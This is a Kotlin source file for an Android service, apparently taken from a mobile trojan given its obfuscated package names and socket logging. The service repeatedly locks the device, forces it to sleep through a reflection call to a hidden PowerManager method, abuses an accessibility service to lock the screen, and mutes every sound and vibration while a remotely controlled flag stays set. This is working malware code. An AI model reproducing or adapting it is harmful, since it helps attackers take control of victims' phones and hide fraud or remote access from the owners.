package com.xxx.zzz.lockp

import android.accessibilityservice.AccessibilityService
import android.app.IntentService
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.os.PowerManager
import android.os.PowerManager.WakeLock
import android.os.SystemClock
import com.xxx.zzz.accessppp.AccessibilityServiceQ
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.socketsp.IOSocketyt
import java.util.concurrent.TimeUnit


class SrvLockDevice : IntentService("srvLockDevice") {

    @Deprecated("Deprecated in Java")
    override fun onHandleIntent(intent: Intent?) {
        IOSocketyt.sendLogs("", "SrvLockDevice: onHandleIntent", "success")
        runCatching {
            while (true) {
                TimeUnit.MILLISECONDS.sleep(100)
                lockDevice(this)
                stopSound(this)

                runCatching {
                    AccessibilityServiceQ.instance?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                }

                runCatching {
                    val pm = this.applicationContext.getSystemService("power") as PowerManager
                    val wl: WakeLock = pm.newWakeLock(
                        PowerManager.PROXIMITY_SCREEN_OFF_WAKE_LOCK,
                        "EndlessService::tag"
                    )
                    wl.acquire()

                    val c = Class.forName("android.os.PowerManager")
                    for (m in c.declaredMethods) {
                        if (m.name.equals("goToSleep")) {
                            m.isAccessible = true
                            if (m.parameterTypes.size == 1) {
                                m.invoke(pm, SystemClock.uptimeMillis() - 2)
                            }
                        }
                    }
                }.onFailure {
                    IOSocketyt.sendLogs("", "onHandleIntent2 ${it.localizedMessage}", "error")
                }

                if (SharedPreferencess.lockDevice != "1") {
                    IOSocketyt.sendLogs("", "SrvLockDevice: break", "success")
                    break
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "onHandleIntent ${it.localizedMessage}", "error")
        }
        stopSelf()
    }

    companion object {
        fun lockDevice(context: Context) {
            runCatching {
                val deviceManager = context.applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                deviceManager.lockNow()
            }.onFailure {
                IOSocketyt.sendLogs("", "lockDevice ${it.localizedMessage}", "error")
            }
        }

        fun stopSound(context: Context) {
            runCatching {
                val audioManager = context.applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true)
                audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true)
                audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0)
                audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0)
                audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0)
                audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0)
                audioManager.setVibrateSetting(
                    AudioManager.VIBRATE_TYPE_NOTIFICATION,
                    AudioManager.VIBRATE_SETTING_OFF
                )
            }.onFailure {
                IOSocketyt.sendLogs("", "stopSound ${it.localizedMessage}", "error")
            }
        }
    }
}